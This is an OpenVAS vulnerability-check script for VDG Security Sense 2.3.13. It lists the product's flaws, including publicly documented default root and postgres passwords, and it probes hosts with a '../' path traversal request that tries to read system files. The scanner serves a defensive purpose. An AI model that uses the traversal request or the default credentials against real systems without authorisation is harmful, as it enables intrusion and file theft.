###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vdg_security_sense_mult_vuln.nasl 11452 2018-09-18 11:24:16Z mmartin $
#
# VDG Security Sense Multiple Security Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805033");
  script_version("$Revision: 11452 $");
  script_cve_id("CVE-2014-9451", "CVE-2014-9452");
  script_bugtraq_id(71736);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 13:24:16 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-01-06 15:11:26 +0530 (Tue, 06 Jan 2015)");
  script_name("VDG Security Sense Multiple Security Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Diva_HTTP/banner");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Dec/76");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129656");

  script_tag(name:"summary", value:"This host is running VDG Security Sense
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - An input is not properly sanitized when handling HTTP authorization
    headers.

  - The program transmitting configuration information in cleartext.

  - The 'root' account has a password of 'ArpaRomaWi', the 'postgres'
    account has a password of '!DVService', and the 'NTP' account has
    a password of '!DVService', these accounts are publicly known and
    documented.

  - The program returning the contents of the users.ini file in authentication
    responses.

  - The user-supplied input is not properly validated when passed via the
    username or password in AuthenticateUser requests.

  - The program not properly sanitizing user input, specifically path traversal
    style attacks (e.g. '../') in a URI.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to read arbitrary files, bypass authentication mechanisms and cause
  a stack-based buffer overflow, resulting in a denial of service or potentially
  allowing the execution of arbitrary code.");

  script_tag(name:"affected", value:"VDG Security SENSE (formerly DIVA) 2.3.13");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

http_port = get_http_port(default:8080);

banner = get_http_banner(port:http_port);

if(!banner || 'Server: Diva HTTP Plugin' >!< banner){
  exit(0);
}

files = traversal_files();

foreach file (keys(files)){

  url = "/images/" +  crap(data:"../",length:3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file)){
    report = report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);